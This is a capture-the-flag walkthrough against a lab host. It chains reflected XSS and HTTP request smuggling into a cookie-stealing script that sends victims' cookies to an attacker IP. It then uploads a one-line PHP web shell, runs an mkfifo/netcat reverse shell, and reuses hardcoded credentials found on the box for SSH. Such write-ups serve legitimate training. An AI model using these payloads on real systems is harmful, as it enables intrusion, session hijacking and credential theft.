
### Reflected XSS

Reflected XSS is a type of **Cross-Site Scripting (XSS)** attack where an attacker injects malicious scripts into a web application. The injected script is **reflected** off the web server and executed in the victim's browser.

**How It Works**

1. **Attacker crafts a malicious URL** containing a script.
2. **Victim clicks the link** (via phishing, comments, etc.).
3. **Web server reflects the input** without sanitization.
4. **Victim’s browser executes the script** (stealing cookies, session hijacking, etc.).

---

# Your job

Go to the home page. There's a **search** field.

So, insert the following code on the search field.

```
"><script>alert('1');</script>
```

After click on the Search button you'll see a pop up window like this:

![[Enumeration-20250325205126744.webp]]

>[!Success]
>The pagee is vulnerable to Reflected XSS.


## Apache 7.1.1 — HTTP Smuggling

HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users. Request smuggling vulnerabilities are often critical in nature, allowing an attacker to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users.

Request smuggling is primarily associated with HTTP/1 requests. However, websites that support HTTP/2 may be vulnerable, depending on their back-end architecture.

This version of Apache is vulnerable to HTTP Smuggling. On this [web](https://regilero.github.io/english/security/2019/10/17/security_apache_traffic_server_http_smuggling/) you can learn more about this vulnerability.

### Exploit

Use the following payload on Burp Suite.

```
GET / HTTP/1.1
Host: bandit.escape
Accept: */*
Connection: keep-alive
Content-Length: 71
Transfer-Encoding: chunked

0
GET /?filter="><script>alert('1')%3B<%2Fscript> HTTP/1.1
Sth:
```

1. Intercept  the http://bandit.escape/?filter=%22%3E%3Cscript%3Ealert%28%271%27%29%3B%3C%2Fscript%3E with Burp Proxy.
2. Send the request to Intruder.
3. Select `Payloads` and set Payload type = `null payloads`.
	![[Exploitation-20250401202714479.webp]]
4. Check the option `Continue indefinitely`.
5. Start the attack.
	![[Exploitation-20250401202952664.webp]]

	Now, upon refreshing the page, we’ll see our XSS in action even though we’re not interacting with the page.

## XSS + HTTP Smuggling = Cookie Graber

Now, you have to combine both vulnerabilities.

There's a tool called [The PHP cookie stealer](https://github.com/TheWation/PhpCookieStealer) that can be use in XSS attacks to steal browser cookies from victims.

The plan is as follows:

1. Host a server that acts as a cookie grabber.
2. Then deploy an XSS payload redirecting to our server.
3. The server reads the cookie.
4. We replace the cookies.


---
# Your job

## Getting access to upload page

#Attacking_Machine 
1. Start a netcat listener.
```
nc -lnvp 8002
```

2. Craft a payload. Create a file called xss.py.
```
import requests

url = "http://bandit.escape/"
body = f"""0

GET /?filter=a" /><script>document.write('<img+src%3d"http%3a//10.50.97.227%3a8002/test.gif%3fcookie%3d'+%2b+document.cookie+%2b+'"+/>')</script> HTTP/1.1
Whatever:""".replace('\n', '\r\n')

headers = {
	"Content-Length": str(len(body)),
	"Transfer-Encoding": "chunked",
	}

while True:
	r = requests.get(url,headers=headers, data=body)
```

3. Save the payload and run it.
```
python3 xss.py
```

4. Wait about a minute.
	![[Exploitation-20250405113050702.webp]]
	Gobuster showed there is a page called `upload.php`. Let's try to access.
	
5. Go to  http://bandit.escape/login.php to get the actual cookie.
6. Go to http://bandit.escape/upload.php.
7. Open the Dev. Options on your browser and paste the cookie from the previous step on the field `value`.

	![[Exploitation-20250405115302330.webp]]
8. Update the page and you'll have access to the uploads page.
	![[Exploitation-20250405115536051.webp]]


---
## File uploading

Trying to upload a sample image fails due to a limit exceeded warning.

![[Exploitation-20250408195208723.webp]]

Create a file called `rse.png` with the following PHP code.

```
<?php echo "test";/>
```

Upload the file.

![[Exploitation-20250408195432891.webp]]

It surprisingly accepts it.
### Finding images directory

Now, you need to know where the images are saved in order to upload a payload.

Returning to the home page of the website, you'll notice that files appear in the gallery as you upload your images.

![[Exploitation-20250408200051691.webp]]

Right-click on the image name and copy the link.

Navigate to the link.

![[Exploitation-20250407200959395.webp]]

You'll see the above message and the the directory where the images are saved is `uploads`.

It is using the MD5 of the filename. Using Burp Suite's Repeater change the extension to PHP and try again,  it also works:

![[Exploitation-20250409193859053.webp]]

Compute the **MD5 hash** of the rse.png file:

```
echo -n "rse.png" | md5sum
```

![[Exploitation-20250408200503817.webp]]

Compute the **MD5 hash** of the rse.php file:

```
echo -n "rse.php" | md5sum
```

![[Exploitation-20250408204051992.webp]]

Visit  http://bandit.escape/uploads/25916dd6b7d8d181938df293a0cc467b.php.

![[Exploitation-20250409194650411.webp]]

>[!Note]
If you try for set a GET request using system payload, it will give you the limit exceeded error again. This indicates that the error is character length based:

![[Exploitation-20250409195535327.webp]]

## Payload

You need a small php payload due to the fact of the limit exceeded errror.

Visit https://www.revshells.com/ and select PHP-cmd small on the left-side panel.

![[Exploitation-20250409200109475.webp]]


The payloadd is <?=`$_GET[0]`?>.

### Insert the payload on the URL

The URL to run the payload will be:

 http://bandit.escape/uploads/25916dd6b7d8d181938df293a0cc467b.php?0=id


![[Exploitation-20250410210118564.webp]]


So, every command you add at the end of the URL will be executed.

### Reverse shell

You can use the following reverse shell on your URL.

#Attacking_Machine 
1. Open a netcat connection.
```
nc -lnvp 9001
```

2. Add the following code to the URL parmaeter 0. The IP is your attacking machine IP and the port must be the same as the same on the point 1.
```
rm+-f+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261 | nc+10.50.97.227+9001+>/tmp/f
```

The URL will be:


```
http://bandit.excape/uploads/a23b176f4afbeb145b123ca1ae330f6f.php?0=rm+-f+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261 | nc+10.50.97.227+9001+>/tmp/f
```

You'll get a reverse shell on the netcat listener.

![[Exploitation-20250410213237338.webp]]

## Lateral movement

Looking into the root directory.

```
ls -al /
```

![[Exploitation-20250410213700215.webp]]

It seems there's a docker environment.

Go to `/app/public` and you'll find a file called `auth.php`.
See what there's inside the file.

```
cd /app/public
cat auth.php
```

The most important part of the code is:

![[Exploitation-20250410214234870.webp]]

There are a username and a password.

`safeadmin: HardcodedMeansUnguessableRight`

### SSH connection

Connect via SSH with the credentials you found.

```
ssh safeadmin@bandit.escape
```

![[Exploitation-20250410214726331.webp]]

